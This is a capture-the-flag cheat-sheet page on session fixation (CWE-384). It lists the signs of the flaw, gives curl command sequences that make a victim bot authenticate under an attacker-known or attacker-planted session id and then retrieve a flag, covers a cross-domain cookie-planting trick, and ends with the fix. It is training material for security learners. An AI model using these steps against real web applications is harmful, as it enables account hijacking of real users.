# Session fixation (CWE-384)

**Idea**: the server keeps the **same session id** across login. If the attacker can make the victim
authenticate under an id the attacker knows, the attacker is now logged in as the victim.

**Signs**:
- a `sid`/session cookie is set on the first visit (before login) and is **unchanged** after login
  (compare cookies before/after logging in yourself);
- the app accepts a session id from the URL (`?SID=`, `;jsessionid=`) or any value you set;
- a **"bot"** (link checker, verifier, admin reviewer) visits/logs in using a session you influence;
- hint "hand them a hallway before they ever sign in".

## Scenario A — pre-generated id + victim bot (auth5)
```bash
curl -s -c j $T/ >/dev/null                       # get a guest sid
curl -s -b j $T/dashboard -o /dev/null -w '%{http_code}\n'   # not authorised yet
curl -s -b j -d "link=$T/" $T/helpdesk/verify-link         # bot logs in UNDER OUR sid
curl -s -b j $T/dashboard | grep -o 'flag{[^}]*}'          # same sid, now privileged
```
Script: `python scripts/auth/session_fixation.py $T --bot /helpdesk/verify-link --data link=$T/ --check /dashboard`

## Scenario B — attacker-chosen id
If the app accepts any id: pick one (`?sid=attacker123` or `Cookie: sid=attacker123`), get the victim
(bot) to log in with it, reuse it.

## Cross-domain cookie
A sibling host on the same parent domain can **set** a cookie for `.parent.tld` that the target app
reads. Find the sibling ([vhosts](../01-recon/vhosts.md)) and any feature that sets cookies to your
value ("remember me", "plant", "preferences", language selector).
```bash
SID=$(python -c "import secrets;print(secrets.token_hex(16))")
curl -s -H "Host: marketing.auth6.chal.deti" -d "sid=$SID" $T/plant -i | grep -i set-cookie
curl -s -d "sid=$SID" $T/helpdesk/verify-link           # bot authenticates that sid
curl -s -b "sid=$SID" $T/dashboard | grep -o 'flag{[^}]*}'
```

## Confirm the root cause (for the write-up)
Cookie value before login == after login ⇒ no regeneration. Fix: new id on login/privilege change,
reject unknown ids, never accept ids from URLs, narrow cookie `Domain`.

Seen in: `auth5` (Alma Portal registrar bot), `auth6` (Brightleaf marketing vhost `/plant`).
